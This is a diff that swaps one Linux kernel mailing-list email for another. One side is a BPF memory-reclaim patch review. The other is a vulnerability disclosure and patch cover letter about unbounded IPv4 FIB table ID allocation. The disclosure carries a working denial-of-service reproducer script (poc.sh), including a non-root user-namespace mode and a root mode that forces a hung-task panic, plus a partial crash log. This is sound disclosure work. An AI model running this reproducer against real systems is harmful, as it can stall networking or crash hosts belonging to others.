@@ -1,167 +1,576 @@
-Received: from mta0.migadu.com (out-63.mta0.migadu.com [91.218.175.63])
+Received: from mail-pg1-f179.google.com (mail-pg1-f179.google.com [209.85.215.179])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 92223431E6D
-	for <linux-kernel@vger.kernel.org>; Tue,  1 Sep 2026 02:59:39 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=91.218.175.63
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id C317425B092
+	for <linux-kernel@vger.kernel.org>; Tue,  1 Sep 2026 03:00:11 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.215.179
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1788231583; cv=none; b=YBD3e1e/Z9f/wfFQ1bFHjYUVseundWP0HDJBBUgSUWAg2MzgONHI3qwUEQZCiQv++P7avSPNO91O7CVB2VbP4o+IQB/pUDxMtkEOwD1pvY9S8IpwIjrq67uO7HUexraY0yfnlgHMuR1RtAiKysZ/jlICjetAwgzEB1Kv4/oPWOg=
+	t=1788231616; cv=none; b=Foua/xdr5Vi2aWhPJIhkjyxxg0dk0L6aWcTj/nryuQHHnt65C8DVuEMq0djK7gyzW4ILPOJuCGBOSjRMiraVQDAPOBaN+QWQ/IOVE+3xkrlBf+MYc18Fegmql4ivSTr+DNl5AL11B9zoDSdOrjThhGbt/Jq1cSZOVAgsUKDuB7s=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1788231583; c=relaxed/simple;
-	bh=ciZZAzaZaR3UaV0eFejfaxcyL47+g1hpSZHv6435/SE=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=X6pLsSecdPrnszi1QWwhOGAVd8b2krqv90IZkUZgOefaT+MvzQDGa8EmVj2juukwZTkgsbSBGT+StlVg+QjQOg9WGb64b6WCltJFMtQSaq8vTtjmCFpW43aAahWO6bUdQRTzy0ATcORNMX8Ad2Ed5zJZCaTe30kK04/rKhnH9Hk=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev; spf=pass smtp.mailfrom=linux.dev; dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b=BVddg9xQ; arc=none smtp.client-ip=91.218.175.63
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=linux.dev
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=linux.dev
+	s=arc-20240116; t=1788231616; c=relaxed/simple;
+	bh=bkW1exBR7Bk34fpw3VVv/NV+NJF4fAWAT9ZeJe4C3uk=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=NMUz9vwfuae9/UpllHT38u9lDY4Khpl2SNNevOJ2/Ac52j5BMaEWjrXc/WFYDLr9q+ePg0bxbt9DOnRu0jjQyg8c94kz9wrsBqHcG4qTshjPTAHZLKUqMVHPVMTUqOzoXcMWmY9hw5w2WSyVSvE//Iupo1nVq/JtsiRZjLf1w2U=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=s93/jJFt; arc=none smtp.client-ip=209.85.215.179
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (1024-bit key) header.d=linux.dev header.i=@linux.dev header.b="BVddg9xQ"
-X-Envelope-To: linux-kernel@vger.kernel.org
-DKIM-Signature: a=rsa-sha256; bh=ciZZAzaZaR3UaV0eFejfaxcyL47+g1hpSZHv6435/SE=;
- c=simple/simple; d=linux.dev;
- h=from:to:subject:date:message-id:mime-version:content-type; s=key1;
- t=1788231577; v=1; x=1788836377;
- b=BVddg9xQfgMBm84LyeQdcvSHAvPMHvHjo+BFO+MmquUDMQLeOuKFqK5661AWKPIRKRb/ODaE
- 22Iw/mt+2pZn0IVc5aWGjiADZ1gD+AG4wT7FHx8oHkFBmNtIRVXGk90u4iXkAowjAmrdoWpV3HR
- dld728wU1Tx6YbToz/bwc0Hs=
-X-Envelope-To: linux-kernel@vger.kernel.org
-Received: by smtp.migadu.com with ESMTPS id 0a8ec0cb1a616635;
-	Tue, 01 Sep 2026 02:59:37 +0000
-X-Mizu-Trace-ID: 0a8ec0cb1a616635
-X-Migadu-Flow: FLOW_OUT
-Message-ID: <4984b835-6cd2-4870-9b2c-ebe74c684b23@linux.dev>
-Date: Tue, 1 Sep 2026 10:59:27 +0800
+	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="s93/jJFt"
+Received: by mail-pg1-f179.google.com with SMTP id 41be03b00d2f7-cc1cc1b42b5so4498639a12.2
+        for <linux-kernel@vger.kernel.org>; Mon, 31 Aug 2026 20:00:11 -0700 (PDT)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=nebusec.ai; s=google; t=1788231610; x=1788836410; darn=vger.kernel.org;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
+        bh=PoBwucHZCZFYpldRzsxD5DpP0znqHFJmwaJsaPjfJxc=;
+        b=s93/jJFtwpCvIRE1Lnth+uigqRk2A0O64+n4QIZj7uscA2m5Mwq5DOqKh2Z0M0ctYX
+         JZfwMeeXYDHZHnHl7d0MgByuUfowdAEU4mg+Lp1El4WjQbKRQY/tan5ZB/fpGG4ga6ON
+         awiJBLn4RZlUjlkglJvYIEwPfYFcnDv0eKqtd3dRDskD0YZu0nK54DR3bhj/YNFifFAT
+         Xjn1zOOOBYTqbDYWx/OZXdQjk0lESMtZ5LpzHFxH07K39VT+eGbqon+KdyYNX/RZ/JWv
+         U1X5wSiJhOhUWCw1j0npALckeh5hzaRUji9wsShq8+E+EbaCotlZ1MpCns6ululHUmJ/
+         FDmA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20251104; t=1788231610; x=1788836410;
+        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
+         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
+         :message-id:reply-to:content-type;
+        bh=PoBwucHZCZFYpldRzsxD5DpP0znqHFJmwaJsaPjfJxc=;
+        b=j62hbG1/X17dFQRQVxMv3zFgFIMBRkEbbfcTFeLnMmnr+08GV8utXAAgpMAEuLZBMf
+         oyKnCLFdOyRnlfVGfhVkC8Yc/1WqJMRTZuh3+zzjL/jSG3YRguANpLmT1QpFxm2Zqx5o
+         4k2uZ50TrYSoPEkRwBWdwZqsbSv5X4MTiQGOZ6BoDM0okdb9kLMcK873fT/tg1i75kSd
+         MhovE6cCdMXMBoJD4sm2Leunz3K2oGt8fEIDDxPhDQJfRmsRiosm7hsAC677GN0lxRwE
+         ER5IgfwVTUiDrIWolfZqVjcasmz4L7Ne8XP+k/MtZkLoxANcFxCGE/sZy/b8QNKA8aJG
+         q9RQ==
+X-Gm-Message-State: AFuF++m2he2Z9XXJHD3AxDwTupJM2f6y5uG6gxYD1RrN0S7GNQ6VEoZe
+	QFxJRgnNJ+1w+seV//yQ6EIh9x/r5gYCFaPnkew7TytTXub9nhczasJSyj14Z1qvguWf
+X-Gm-Gg: AYBFou1cOm2HCo0QU/ExtNPxbQqS7Wm+7J6ekutzGqNNwBvctioEq5ZGiPchxo/49Ss
+	zHZcuwKqbSy/56XQnqc1h2TJTh6lh0dwew+MAuHFysp1ZxHF18DnnBreprSaJEpxyDuAlMVk+Cm
+	k+voSn/iyrFavX32AUQNvMQw4Ri1KBA6ft7WfCIDBlRFvzsIt4nR9CK7VmeHcB+SB/E+SI7mMck
+	KVhf0cYkIWNRZ8UN02YwgTs8cf4z4PiTqAqFd7t9QMMfgAvhYmukksZhWRyQzvdmGbeWMksimD8
+	RmQuaVIaJXOE3oAYcFHSZS42diAmCF5T4SsLX5JFI0yhMT514c3Cl5nQCFGTu6tnH2UU/4Ivf3W
+	uFEr00MBrH5efl1hPiGKMkbaB7xWz3eE+IqQ6HAfNNS+vmcTz1YnUQkPwc4Txpn+Z5zIwEFb+Qf
+	2I46g93BCNObXrcqF8Dvt6p2OqVC6eNHbEPvGAuviJzuQT/ZantxW+Gs06pKTcHn8kFPkyD2xw/
+	C4uBLlpe9vMH0iIq7U=
+X-Received: by 2002:a17:90b:3904:b0:398:9be8:ea6a with SMTP id 98e67ed59e1d1-39907ed4294mr6052051a91.23.1788231609895;
+        Mon, 31 Aug 2026 20:00:09 -0700 (PDT)
+Received: from b6ad5085b32f.. ([122.51.212.64])
+        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-3990baaeec3sm2909012a91.0.2026.08.31.20.00.06
+        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
+        Mon, 31 Aug 2026 20:00:09 -0700 (PDT)
+From: Zihan Xi <zihanx@nebusec.ai>
+To: netdev@vger.kernel.org
+Cc: linux-kernel@vger.kernel.org,
+	David Ahern <dsahern@kernel.org>,
+	Ido Schimmel <idosch@nvidia.com>,
+	"David S . Miller" <davem@davemloft.net>,
+	Eric Dumazet <edumazet@google.com>,
+	Jakub Kicinski <kuba@kernel.org>,
+	Paolo Abeni <pabeni@redhat.com>,
+	Simon Horman <horms@kernel.org>,
+	Patrick McHardy <kaber@trash.net>,
+	stable@vger.kernel.org,
+	Zihan Xi <zihanx@nebusec.ai>
+Subject: [PATCH net v2 0/1] ipv4: fib: bound automatic table ID allocation
+Date: Tue,  1 Sep 2026 03:00:00 +0000
+Message-ID: <cover.1788223735.git.zihanx@nebusec.ai>
+X-Mailer: git-send-email 2.47.3
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Betterbird (macOS/Intel)
-Subject: Re: [PATCH bpf-next v5 1/2] mm/bpf: Add bpf_proactive_reclaim kfunc
-To: Kumar Kartikeya Dwivedi <memxor@gmail.com>,
- Shakeel Butt <shakeel.butt@linux.dev>
-Cc: Roman Gushchin <roman.gushchin@linux.dev>,
- JP Kobryn <inwardvessel@gmail.com>, Andrew Morton
- <akpm@linux-foundation.org>, Andrii Nakryiko <andrii@kernel.org>,
- Eduard Zingerman <eddyz87@gmail.com>, Ihor Solodrai
- <ihor.solodrai@linux.dev>, Alexei Starovoitov <ast@kernel.org>,
- Daniel Borkmann <daniel@iogearbox.net>,
- Martin KaFai Lau <martin.lau@linux.dev>, Song Liu <song@kernel.org>,
- Yonghong Song <yonghong.song@linux.dev>, Jiri Olsa <jolsa@kernel.org>,
- Emil Tsalapatis <emil@etsalapatis.com>, Shuah Khan <shuah@kernel.org>,
- Barry Song <baohua@kernel.org>, Geliang Tang <geliang@kernel.org>,
- linux-kernel@vger.kernel.org, bpf@vger.kernel.org, linux-mm@kvack.org,
- linux-kselftest@vger.kernel.org, Hui Zhu <zhuhui@kylinos.cn>
-References: <cover.1787826402.git.zhuhui@kylinos.cn>
- <5dfdc7800469eac4e9a240f2422ba65d4ef4c4ba.1787826402.git.zhuhui@kylinos.cn>
- <apHk86Y8araBlXcq@linux.dev> <DL0VTAZE10HC.3R4HIC6S0U3P1@gmail.com>
-Content-Language: en-US
-From: Hui Zhu <hui.zhu@linux.dev>
-In-Reply-To: <DL0VTAZE10HC.3R4HIC6S0U3P1@gmail.com>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
+Content-Transfer-Encoding: 8bit
 
+Hi Linux kernel maintainers,
 
-> On Fri Aug 28, 2026 at 9:53 PM CEST, Shakeel Butt wrote:
->> On Thu, Aug 27, 2026 at 06:36:29PM +0800, Hui Zhu wrote:
->>> From: Hui Zhu <zhuhui@kylinos.cn>
->>>
->>> Add bpf_proactive_reclaim(), a sleepable kfunc which performs one
->>> proactive reclaim pass on a given memory cgroup, similar to a write
->>> to memory.reclaim but without retrying until the target is reached.
->>>
->>> The kfunc refuses to reclaim if the calling task is already in a
->>> reclaim context, as a nested reclaim would corrupt the outer reclaim
->>> state.
->>>
->>> Signed-off-by: Hui Zhu <zhuhui@kylinos.cn>
->>> ---
->>>   mm/bpf_memcontrol.c | 46 +++++++++++++++++++++++++++++++++++++++++++++
->>>   1 file changed, 46 insertions(+)
->>>
->>> diff --git a/mm/bpf_memcontrol.c b/mm/bpf_memcontrol.c
->>> index 716df49d7647..297ff7f05042 100644
->>> --- a/mm/bpf_memcontrol.c
->>> +++ b/mm/bpf_memcontrol.c
->>> @@ -6,6 +6,7 @@
->>>    */
->>>
->>>   #include <linux/memcontrol.h>
->>> +#include <linux/swap.h>
->>>   #include <linux/bpf.h>
->>>
->>>   __bpf_kfunc_start_defs();
->>> @@ -159,6 +160,49 @@ __bpf_kfunc void bpf_mem_cgroup_flush_stats(struct mem_cgroup *memcg)
->>>   	mem_cgroup_flush_stats(memcg);
->>>   }
->>>
->>> +/*
->>> + * Reclaim must not recurse: try_to_free_mem_cgroup_pages() overwrites
->>> + * current->reclaim_state, so a nested call would corrupt the outer
->>> + * reclaim state. Reclaim windows are marked with PF_MEMALLOC;
->>> + * reclaim_state is also checked because it is installed slightly
->>> + * before PF_MEMALLOC.
->>> + */
->>> +static bool bpf_in_reclaim_context(void)
->>> +{
->>> +	return (current->flags & PF_MEMALLOC) || current->reclaim_state;
->>> +}
->>> +
->>> +/**
->>> + * bpf_proactive_reclaim - proactively reclaim memory from a memory
->>> + *                         cgroup
->>> + * @memcg: the target memory cgroup to reclaim from
->>> + * @size:  the amount of memory to reclaim, in bytes
->>> + *
->>> + * Trigger one proactive reclaim pass on @memcg, similar to a write to
->>> + * memory.reclaim, but without retrying until @size is reached.
->>> + * Must not be called with a filesystem lock held: the reclaim path
->>> + * may deadlock on it via filesystem shrinkers.
->>> + *
->>> + * Return: The amount of memory reclaimed, in bytes, or 0 if @size is
->>> + * smaller than a page or the task is already in a reclaim context.
->>> + */
->>> +__bpf_kfunc unsigned long bpf_proactive_reclaim(struct mem_cgroup *memcg,
->>> +						unsigned long size)
->>> +{
->>> +	unsigned long nr_reclaimed;
->>> +
->>> +	if (size < PAGE_SIZE || unlikely(bpf_in_reclaim_context()))
->>> +		return 0;
->> I have been thinking about this more and more and after looking at the reasoning
->> behind your check current->reclaim_state and also Sashiko's comment on NOIO/NOFS
->> contexts, I am more convinced that this kfunc can not be a simple sleepable
->> function. We need more than that. We need clean process context as well similar
->> to the userspace poking memory.reclaim. Something like kthread or workqueue.
->>
->> Kumar & Andrii, is there a way to restrict a kfunc to only be called from
->> special BPF threads/workqueues? Is there some similar concept in BPF world?
->>
-> Yeah, I think the concern is valid. E.g. inode_rmdir() is sleepable but will be
-> problematic here, I think. My first instinct was if bpf_in_reclaim_context() +
-> nofs/noio save-restore might provide enough protection to let it be callable
-> from generic sleepable contexts, but I guess that will disable invocation of
-> filesystem shrinkers unconditionally.
->
-> So my suggestion would be to fix the context to BPF_PROG_TYPE_SYSCALL. There, we
-> should be able to init and schedule timers which poll specific state and arms wq
-> execution etc. It then remains invocable from sleepable async contexts (wq,
-> task_work) or the syscall program, all of which should be ok. Once BPF kthread
-> lands we can let it be callable from those threads as well, but that is for
-> later.
+We found and validated a issue in net/ipv4/fib_rules.c. The bug is
+reachable by a non-root user via user and net namespace.
+We've tested it, and it should not affect any other functionality.
 
-Hi Kumar and Shakeel,
+We will provide detailed information about the bug
+in this email, along with a PoC to trigger it.
 
+---- details below ----
 
-The patch has been modified according to your comments.
+Bug details:
 
-Please help me review it.
+fib_empty_table() probes every table ID from 1 until it finds a free one.
+IPv4 tables are stored in a 256-bucket hash table, so a dense range of IDs
+makes each probe walk a growing hash chain while RTNL is held. Rules that
+used an unspecified table leave the allocated table behind when deleted,
+allowing a namespace administrator to accumulate this state.
 
+v1 rewrote the search to count tables once and pick the lowest free ID from
+a bitmap. Ido Schimmel noted that automatic table assignment ("ip rule ...
+table 0") is an undocumented IPv4-only quirk and suggested bounding the
+automatically allocated ID instead. v2 follows that approach and stops the
+search at 4096. Explicit table IDs above that remain usable.
 
-Best,
+The table-allocation path is reachable with CAP_NET_ADMIN in a user and net
+namespace; the userns-demo below confirms table persistence after table-0
+add/delete pairs. The hung-task panic mode requires root only to set global
+hung-task sysctls and force a panic; it is an oracle for the same RTNL
+hold, not the minimum privilege needed to reach the bad lookup.
 
-Hui
+Commit 1af5a8c4a11c ("[IPV4]: Increase number of possible routing tables to
+2^32") switched fib_empty_table() from an array probe to fib_get_table(),
+but RT_TABLE_MAX was still 255. The unbounded automatic scan first became
+possible in commit b801f54917b7 ("[NET]: Increate RT_TABLE_MAX to 2^32"),
+which raised RT_TABLE_MAX to 0xFFFFFFFF. Fixes therefore points to that
+later commit.
 
+Validation reproduced the hung-task panic on the unpatched kernel. On the
+v2 kernel, the same 150000-table RTNL contention PoC finished without a
+hung-task report or panic; the table-0 add returned ENOBUFS once IDs
+1..4096 were occupied.
 
->> [...]
+Reproducer:
+
+    bash poc.sh userns-demo
+    ROUTE_TABLE_COUNT=150000 bash poc.sh root-crash
+
+We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.
+
+------BEGIN poc.sh------
+#!/bin/bash
+set -euo pipefail
+
+MODE="${1:-root-crash}"
+ROUTE_TABLE_COUNT="${ROUTE_TABLE_COUNT:-150000}"
+USERNS_ROUTE_TABLE_COUNT="${USERNS_ROUTE_TABLE_COUNT:-10000}"
+PREF="${PREF:-900000}"
+SRC_IP="${SRC_IP:-198.51.100.200}"
+
+usage() {
+	cat >&2 <<'EOF'
+usage:
+  bash poc.sh root-crash
+  bash poc.sh userns-demo
+
+root-crash:
+  Root only. Sets hung-task sysctls, creates a fresh net namespace, populates
+  many explicit IPv4 route tables, then triggers one table-unspecified IPv4
+  rule add while a second RTNL operation blocks behind it. The expected result
+  is a hung-task panic attributed to the long RTNL hold.
+
+userns-demo:
+  Re-execs under unshare -Urn and demonstrates:
+    1. table persistence after table-0 rule add/delete pairs
+    2. route-table prepopulation plus a table-0 rule add reaching lookup N+1
+EOF
+	exit 1
+}
+
+require_root() {
+	if [ "$(id -u)" -ne 0 ]; then
+		echo "root-crash requires root" >&2
+		exit 1
+	fi
+}
+
+generate_route_batch() {
+	local count="$1"
+	local batch="$2"
+
+	python3 - "$count" "$batch" <<'PY'
+import sys
+
+count = int(sys.argv[1])
+batch = sys.argv[2]
+
+with open(batch, "w", encoding="ascii") as f:
+    for i in range(1, count + 1):
+        f.write(f"route add blackhole 203.0.113.1/32 table {i}\n")
+PY
+}
+
+route_setup_and_final_add_demo() {
+	local count="$1"
+
+	python3 - "$count" "$PREF" "$SRC_IP" <<'PY'
+import subprocess
+import sys
+import time
+
+count = int(sys.argv[1])
+pref = sys.argv[2]
+src = sys.argv[3]
+batch = "/tmp/fib-empty-table-route-batch.txt"
+
+with open(batch, "w", encoding="ascii") as f:
+    for i in range(1, count + 1):
+        f.write(f"route add blackhole 203.0.113.1/32 table {i}\n")
+
+start = time.monotonic()
+subprocess.run(["ip", "-4", "-batch", batch], check=True)
+mid = time.monotonic()
+subprocess.run(
+    ["ip", "-4", "rule", "add", "pref", pref, "from", f"{src}/32", "table", "0"],
+    check=True,
+)
+end = time.monotonic()
+out = subprocess.check_output(["ip", "-4", "rule", "show", "pref", pref], text=True)
+
+print(f"route_setup_s={mid - start:.6f}")
+print(f"final_add_s={end - mid:.6f}")
+print(out.strip())
+PY
+}
+
+demo_rule_persistence() {
+	for i in 1 2 3; do
+		local pref=$((100 + i))
+		ip -4 rule add pref "$pref" from "198.51.100.$i/32" table 0
+		ip -4 rule del pref "$pref" from "198.51.100.$i/32" table 0
+	done
+
+	ip -4 rule add pref 200 from 198.51.100.200/32 table 0
+	ip -4 rule show pref 200
+	ip -4 rule del pref 200 from 198.51.100.200/32 table 0
+}
+
+run_userns_inner() {
+	echo "[*] Table-0 rule persistence demo"
+	demo_rule_persistence
+
+	echo "[*] Route-table prepopulation demo"
+	route_setup_and_final_add_demo "$USERNS_ROUTE_TABLE_COUNT"
+	ip -4 rule del pref "$PREF" from "$SRC_IP/32" table 0 2>/dev/null || true
+}
+
+run_userns_demo() {
+	exec unshare -Urn -- env \
+		USERNS_ROUTE_TABLE_COUNT="$USERNS_ROUTE_TABLE_COUNT" \
+		PREF="$PREF" \
+		SRC_IP="$SRC_IP" \
+		bash "$0" __userns_inner
+}
+
+run_root_crash_inner() {
+	local batch="/tmp/fib-empty-table-root-crash-batch.txt"
+
+	generate_route_batch "$ROUTE_TABLE_COUNT" "$batch"
+	ip -4 -batch "$batch"
+
+	printf '%s\n' \
+		'fib-empty-table-poc: starting final rule add after route-table prepopulation' \
+		> /dev/kmsg
+
+	(
+		sleep 0.05
+		printf '%s\n' \
+			'fib-empty-table-poc: helper RTNL op attempting ip link set lo up' \
+			> /dev/kmsg
+		ip link set lo up
+	) &
+	local helper_pid=$!
+
+	ip -4 rule add pref "$PREF" from "$SRC_IP/32" table 0
+	wait "$helper_pid"
+}
+
+run_root_crash() {
+	require_root
+
+	sysctl -w \
+		kernel.panic_on_warn=0 \
+		kernel.softlockup_panic=0 \
+		kernel.watchdog_thresh=55 \
+		kernel.hung_task_timeout_secs=1 \
+		kernel.hung_task_check_interval_secs=1 \
+		kernel.hung_task_panic=1 \
+		kernel.hung_task_all_cpu_backtrace=1 >/dev/null
+
+	exec unshare -n -- env \
+		ROUTE_TABLE_COUNT="$ROUTE_TABLE_COUNT" \
+		PREF="$PREF" \
+		SRC_IP="$SRC_IP" \
+		bash "$0" __root_crash_inner
+}
+
+case "$MODE" in
+root-crash)
+	run_root_crash
+	;;
+userns-demo)
+	run_userns_demo
+	;;
+__userns_inner)
+	run_userns_inner
+	;;
+__root_crash_inner)
+	run_root_crash_inner
+	;;
+*)
+	usage
+	;;
+esac
+------END poc.sh--------
+
+----BEGIN crash log----
+[  281.774236] fib-empty-table-poc: starting final rule add after route-table prepopulation
+[  282.029352] fib-empty-table-poc: helper RTNL op attempting ip link set lo up
+[  283.213038] INFO: task ip:269 blocked for more than 1 seconds.
+[  283.213285]       Not tainte
+** replaying previous printk message **
+[  283.213285]       Not tainted 7.2.0-15794-g1b78070aaef6 #3
+[  283.213429] "echo 0 > /proc/sys/kernel/hung_task_timeout_secs" disables this message.
+[  283.213454] task:ip              state:D stack:13072 pid:269   tgid:269   ppid:266    task_flags:0x400100 flags:0x00080000
+[  283.213507] Call Trace:
+[  283.213626]  <TASK>
+[  283.213654]  __schedule (kernel/sched/core.c:5520 kernel/sched/core.c:7270)
+[  283.299679]  schedule (kernel/sched/core.c:7347 kernel/sched/core.c:7362)
+[  283.299981]  schedule_preempt_disabled (kernel/sched/core.c:7419)
+[  283.299990]  __mutex_lock.constprop.0 (kernel/locking/mutex.c:726 kernel/locking/mutex.c:821)
+[  283.300074]  rtnl_newlink (net/core/rtnetlink.c:80 net/core/rtnetlink.c:366 net/core/rtnetlink.c:4214)
+[  283.300328]  ? cred_has_capability.isra.0 (security/selinux/hooks.c:1668)
+[  283.300467]  ? __pfx_rtnl_newlink (net/core/rtnetlink.c:3515)
+[  283.300471]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
+[  283.300479]  ? kmem_cache_alloc_noprof (mm/slub.c:4693 mm/slub.c:4996 mm/slub.c:5010)
+[  283.305030]  ? ebitmap_cpy (security/selinux/ss/ebitmap.c:58 (discriminator 2))
+[  283.305131]  ? avc_has_perm (include/linux/rcupdate.h:882 security/selinux/avc.c:1164 security/selinux/avc.c:1194)
+[  283.305141]  ? __pfx_rtnetlink_rcv_msg (net/core/rtnetlink.c:4497)
+[  283.305147]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
+[  283.305315]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
+[  283.305323]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
+[  283.305327]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2281 (discriminator 1))
+[  283.305445]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
+[  283.305452]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
+[  283.305593]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
+[  283.305705] RIP: 0033:0x7f5f34e0deec
+[  283.305711] RSP: 002b:00007fff80031098 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
+[  283.305763] RAX: ffffffffffffffda RBX: 00007fff80031788 RCX: 00007f5f34e0deec
+[  283.305765] RDX: 0000000000000020 RSI: 00007fff800310b0 RDI: 0000000000000003
+[  283.305767] RBP: 0000000000000004 R08: 0000000000000000 R09: 0000000000000000
+[  283.305769] R10: 0000000000000000 R11: 0000000000000246 R12: 00007fff80031ea8
+[  283.305770] R13: 00007fff80031780 R14: 0000000000000003 R15: 0000000000000000
+[  283.305774]  </TASK>
+[  283.307861] INFO: task ip:269 is blocked on a mutex likely owned by task ip:267.
+[  283.308103] task:ip              state:R  running task     stack:13072 pid:267   tgid:267   ppid:253    task_flags:0x400100 flags:0x00080000
+[  283.308114] Call Trace:
+[  283.308116]  <TASK>
+[  283.308118]  __schedule (kernel/sched/core.c:5520 kernel/sched/core.c:7270)
+[  283.308129]  preempt_schedule_irq (kernel/sched/core.c:7592)
+[  283.308131]  irqentry_exit (include/linux/irq-entry-common.h:468 include/linux/irq-entry-common.h:539 kernel/entry/common.c:167)
+[  283.308135]  ? irqentry_exit (include/linux/hrtimer_rearm.h:58 include/linux/hrtimer_rearm.h:67 include/linux/irq-entry-common.h:505 include/linux/irq-entry-common.h:542 kernel/entry/common.c:167)
+[  283.308138]  asm_sysvec_apic_timer_interrupt (arch/x86/include/asm/idtentry.h:674)
+[  283.309934] RIP: 0010:fib_get_table (net/ipv4/fib_frontend.c:147)
+[  283.309948] Code: 90 90 90 90 90 90 90 90 90 90 90 90 90 90 0f 1f 40 d6 85 f6 74 23 40 0f b6 c6 48 c1 e0 03 48 03 87 48 05 00 00 eb 05 39 70 10 <74> 08 48 8b 00 48 85 c0 75 f3 c3 cc cc cc cc b8 f0 07 00 00 be fe
+All code
+========
+   0:	90                   	nop
+   1:	90                   	nop
+   2:	90                   	nop
+   3:	90                   	nop
+   4:	90                   	nop
+   5:	90                   	nop
+   6:	90                   	nop
+   7:	90                   	nop
+   8:	90                   	nop
+   9:	90                   	nop
+   a:	90                   	nop
+   b:	90                   	nop
+   c:	90                   	nop
+   d:	90                   	nop
+   e:	0f 1f 40 d6          	nopl   -0x2a(%rax)
+  12:	85 f6                	test   %esi,%esi
+  14:	74 23                	je     0x39
+  16:	40 0f b6 c6          	movzbl %sil,%eax
+  1a:	48 c1 e0 03          	shl    $0x3,%rax
+  1e:	48 03 87 48 05 00 00 	add    0x548(%rdi),%rax
+  25:	eb 05                	jmp    0x2c
+  27:	39 70 10             	cmp    %esi,0x10(%rax)
+  2a:*	74 08                	je     0x34		<-- trapping instruction
+  2c:	48 8b 00             	mov    (%rax),%rax
+  2f:	48 85 c0             	test   %rax,%rax
+  32:	75 f3                	jne    0x27
+  34:	c3                   	ret
+  35:	cc                   	int3
+  36:	cc                   	int3
+  37:	cc                   	int3
+  38:	cc                   	int3
+  39:	b8 f0 07 00 00       	mov    $0x7f0,%eax
+  3e:	be                   	.byte 0xbe
+  3f:	fe                   	.byte 0xfe
+
+Code starting with the faulting instruction
+===========================================
+   0:	74 08                	je     0xa
+   2:	48 8b 00             	mov    (%rax),%rax
+   5:	48 85 c0             	test   %rax,%rax
+   8:	75 f3                	jne    0xfffffffffffffffd
+   a:	c3                   	ret
+   b:	cc                   	int3
+   c:	cc                   	int3
+   d:	cc                   	int3
+   e:	cc                   	int3
+   f:	b8 f0 07 00 00       	mov    $0x7f0,%eax
+  14:	be                   	.byte 0xbe
+  15:	fe                   	.byte 0xfe
+[  283.309951] RSP: 0018:ffffac760030b8a8 EFLAGS: 00000206
+[  283.309955] RAX: ffff8f608e6e7400 RBX: ffff8f60839b4480 RCX: 000000000000003c
+[  283.309957] RDX: 0000000000000001 RSI: 00000000000025bd RDI: ffff8f6085dc1f80
+[  283.309959] RBP: ffffac760030b960 R08: ffffac760030b850 R09: 0000000000000020
+[  283.309960] R10: ffffac760030b960 R11: 0000000000000002 R12: ffff8f6083bb1090
+[  283.309962] R13: 0000000000000000 R14: ffff8f6085dc1f80 R15: 00000000000025bd
+[  283.310061]  fib4_rule_configure (net/ipv4/fib_rules.c:222 net/ipv4/fib_rules.c:315)
+[  283.310212]  fib_newrule (net/core/fib_rules.c:927)
+[  283.310348]  ? mas_wr_spanning_store (lib/maple_tree.c:3177)
+[  283.310363]  ? __pfx_fib_nl_newrule (net/core/fib_rules.c:1002)
+[  283.310367]  ? rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
+[  283.310373]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
+[  283.310377]  ? xas_load (lib/xarray.c:239)
